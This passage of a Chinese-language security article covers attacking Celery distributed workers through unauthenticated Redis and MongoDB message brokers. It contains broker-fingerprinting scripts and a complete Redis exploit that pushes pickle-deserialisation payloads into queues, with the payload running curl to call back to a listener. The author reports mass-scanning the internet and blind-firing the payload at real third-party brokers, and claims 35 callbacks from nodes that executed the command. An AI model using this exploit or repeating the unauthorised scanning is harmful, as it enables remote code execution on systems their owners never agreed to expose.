    messages.routing
其中 messages.routing 含有每一个队列以及消息路由的信息，messages
则存储了所有队列中的消息数据。[](http://www.mottoin.com/89644.html/13-54)
那么就可以根据不同中间件服务的特征去验证一个 Redis 或者 MongoDB 是否作为 Broker 存在于 Celery 分布式应用中。
针对 Redis 和 MongoDB 可编写出相应的验证脚本，其代码关键部分为：
    # celery_broker_redis_check.py
    ...
    CELERY_KEYS = ['celery', 'unacked', '_kombu.binding']
    def run(seed):
        try:
            ip, port = seed.split(':')
        except ValueError as ex:
            ip, port = seed, 6379
        r = redis.Redis(ip, int(port), socket_connect_timeout=5)
        keys = r.keys()
        info = dict(succeed=False, keys=list())
        for _k in CELERY_KEYS:
            for key in keys:
                if _k in key:
                    info['succeed'] = True
                    info['keys'].append(key)
        return info
    ...
针对未授权的 Redis 服务，直接对所有 KEYS 值进行特征匹配，如果遇到其 KEY 值包含有 ['celery', 'unacked',
'_kombu.binding'] 中任意一个字符串即可判断该服务作为了 Celery 应用的消息队列中间件。
    # celery_broker_mongodb_check.py
    ...
    CELERY_COLLECTIONS = ['messages.routing', 'messages.broadcast']
    def run(seed):
        try:
            ip, port = seed.split(':')
        except ValueError as ex:
            ip, port = seed, 27017
        conn = pymongo.MongoClient(ip, int(port), connectTimeoutMS=2000,
                                   serverSelectionTimeoutMS=2000)
        dbs = conn.database_names()
        info = dict(succeed=False, results=dict())
        for db in dbs:
            colnames = conn.get_database(db).collection_names()
            for _col in CELERY_COLLECTIONS:
                if any(_col in colname for colname in colnames):
                    info['succeed'] = True
                    info['results'][db] = colnames
                    continue
        return info
    ...
而由于 Celery 在使用 MongoDB 的时候需要指定数据库，所以需要对存在未授权访问的 MongoDB
中的每一个数据库都进行检测，判断其中的集合名称是否符合条件，若符合即可判断其作为了消息队列中间件。  
**2\. 使用脚本进行消息注入攻击分布式节点**
使用上面两个脚本在本地环境进行测试：
[](http://www.mottoin.com/89644.html/14-49)
这里要说明的一个问题就是，不是所有使用了 Celery 分布式框架的应用都配置了 pickle 的序列化方式，若其只配置了 JSON
等其他安全的序列化方式，则就无法利用 Python 反序列化进行命令执行了。
一个简单的真对 Redis Broker 类型的攻击脚本：
    # celery_broker_redis_exp.py
    import re
    import json
    import redis
    import pickle
    import base64
    evil_command = 'curl http://127.0.0.1:8000/{}'
    def create_evil_task_body(command, body_encoding='base64'):
        class Command(object):
            def __reduce__(self):
                import os
                return (os.system, (command, ))
        if body_encoding == 'base64':
            return base64.b64encode(pickle.dumps(Command()))
    def create_evil_message(body):
        message = {"body": body,"headers": {},"content-encoding": "binary","content-type": "application/x-python-serialize","properties": {"body_encoding": "base64","reply_to": "c8b55284-c490-3927-85c5-c68a7fed0525","correlation_id": "1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe","delivery_info": {"routing_key": "celery","exchange": "celery","priority": 0},"delivery_mode": 2,"delivery_tag": "027bd89a-389e-41d1-857a-ba895e6eccda"}}
        return json.dumps(message)
    def exp(seed):
        try:
            ip, port = seed.split(':')
        except ValueError as ex:
            ip, port = seed, 6379
        r = redis.Redis(ip, int(port), socket_connect_timeout=5)
        keys = r.keys()
        info = dict(succeed=False, keys=list())
        for key in keys:
            matched = re.search(r'^_kombu.binding.(?P&lt;queue&gt;.*)', key)
            if matched:
                queue_name = matched.group('queue')
                message = create_evil_message(
                    create_evil_task_body(evil_command.format(queue_name))
                )
                r.lpush(queue_name, message)
    exp('192.168.99.100')
为了测试攻击脚本，首先需要在 192.168.99.100 上开启 Redis 服务并配置为外部可连且无需验证，然后在本地起一个
SimpleHTTPServer 用于接收节点执行命令的请求，最后可直接通过终端配置 Broker 为 Redis 起一个默认的 worker：
    celery worker --broker='redis://:@192.168.99.100/0'
整个过程演示：  
[](http://www.mottoin.com/89644.html/15-44)
可以看到通过往消息队列中插入恶意消息，被分布式节点 worker 获取解析后触发了反序列化漏洞导致了远程命令执行。
**互联网案例检测**
上一节内容通过实际的代码和演示过程说明了如何通过特征去验证消息队列中间件是否作为了 Celery
分布式框架的一部分，那么互联网中是否真的存在这样的实例呢。这里再次理一下针对 Celery 分布式节点攻击的思路：
1、找寻那有着未授权访问且用于 Celery 消息队列传递的中间件服务；
2、往消息队列中插入恶意消息数据，因无法确定目标是否允许进行 pickle 方式序列化，所以会进行 Payload 盲打；
3、等待分布式节点取走消息进行解析，触发反序列化漏洞执行任意代码；
首先针对第一点，利用脚本去扫描互联网中存在未授权访问且用于 Celery 消息队列传递的 Redis 和 MongoDB 服务。通过扫描得到未授权访问的
Redis 有 14000+ 个，而未授权访问的 MongoDB 同样也有 14000+ 个。
针对 14000+ 个存在未授权访问的 Redis 服务使用上一节的验证脚本（celery_broker_redis_check.py）进行批量检测，得到了
86 个目标满足要求，扫描过程截图：
[](http://www.mottoin.com/89644.html/16-43)
同样的针对 14000+ 个存在未授权访问的 MongoDB 服务进行批量检测，得到了 22 个目标满足要求，扫描过程截图：
[](http://www.mottoin.com/89644.html/17-35)
根据结果来看，虽然最终满足条件的目标数量并不多，但是这足以说明利用消息注入对分布式节点进行攻击的思路是可行的，并且在消息队列中间件后面有多少个 worker
节点并不知道，危害的不仅仅是 Broker 而是后面的整个节点。
由于具体的攻击 Payload
使用了盲打，所以不能直接获取远端成功执行命令的结果，所以这里借助外部服务来监听连接请求并进行标识，若一个分布式节点成功触发了漏洞，它会去请求外部服务器。
针对 Redis 检测过程截图：
[](http://www.mottoin.com/89644.html/18-26)
其中服务器上收到了 32 个成功执行命令并回连的请求：
[](http://www.mottoin.com/89644.html/19-25)
同样的针对 MongoDB 检测过程截图：
[](http://www.mottoin.com/89644.html/20-23)
其中服务器上成功收到 3 个成功执行命令并回连的请求：
[](http://www.mottoin.com/89644.html/21-21)
从最后得到的数据来看，成功触发漏洞导致远程命令执行的目标数量并不多，而且整个利用条件也比较苛刻，但就结论而言，已经直接解答了文章一开始所提出的疑问，利用多个漏洞对分布式节点进行攻击的思路也成功得到了实践。
（写了那么多，更多的想把自己平常折腾和研究的一些点给分享出来，理论应用到实战，没有案例的漏洞都不能称之为好漏洞。将一些想法和思路付之于实践，终究会得到验证。）
**相关链接**
[Celery 分布式框架项目 –
http://www.celeryproject.org/](http://www.celeryproject.org/)
[Python “pickle” 模块文档 –
https://docs.python.org/2/library/pickle.html](https://docs.python.org/2/library/pickle.html)
[Django 远程命令执行漏洞详解 – http://rickgray.me/2015/09/12/django-command-execution-analysis.html](http://rickgray.me/2015/09/12/django-command-execution-analysis.html)